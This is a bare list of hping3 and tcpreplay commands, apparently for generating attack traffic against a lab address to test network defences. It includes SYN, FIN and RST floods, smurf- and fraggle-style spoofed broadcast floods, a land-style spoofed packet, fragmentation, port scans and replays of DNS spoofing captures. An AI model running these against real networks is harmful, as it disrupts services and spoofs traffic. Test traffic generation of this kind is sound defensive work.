hping3 -i u1 -c 600000 -s 1024 -p 1025 -F 172.168.4.4 -k. 
hping3 -i u1 -c 600000 -s 1024 -p 1025 -R 172.168.4.4 -k. 
hping3 -c 10 -s 1025 -p 0 -d 128 172.168.4.4.
hping3 -i u1 -c 10000 -2 -s 1024 -p 7 -d 64 --spoof 172.168.4.4 172.168.1.255. 
hping3 -i u1000 -c 100 -s 1024 -p 1024 -d 1024 172.168.4.4 -f -S -m 32 
hping3 -i u1 -c 600000 -S -s 1024 -p 1025 172.168.4.4 -k. 
hping3 -i u5000 -c 2000 -s 2048 -p ++1024 -2 -k -d 128 172.168.1.2
hping3 -c 10 -1 -d 0 172.168.4.4
hping3 -i u1 -c 10000 -S -s 80 -p 80 --spoof 172.168.4.4 172.168.4.4 -k -d 128 
hping3 -i u10000 -c 300 -1 -d 128 172.168.4.4
hping3 -i u10000 -c 2500 -S -s 1024 -p ++1024 -d 128 172.168.4.4 -q
hping3 -i u10 -c 1000 -1 --spoof 172.168.4.4 172.168.4.255 -d 128
tcpreplay-edit -i $SOURCE_INTERFACE --enet-smac=$SOURCE_MAC--enet-dmac=$DEST_MAC dns-spoof-server.pcap
tcpreplay-edit -i $SOURCE_INTERFACE --enet-smac=$SOURCE_MAC --enet-dmac=$DEST_MAC dns_reply_mismatch.pcap
tcpreplay-edit -i $SOURCE_INTERFACE --enet-smac=$SOURCE_MAC --enet-dmac=$DEST_MAC dns-mismatch.pcap
hping3 -i u1 -c 100 -2 -s 1024 -p 53 -d 1400 172.168.4.4
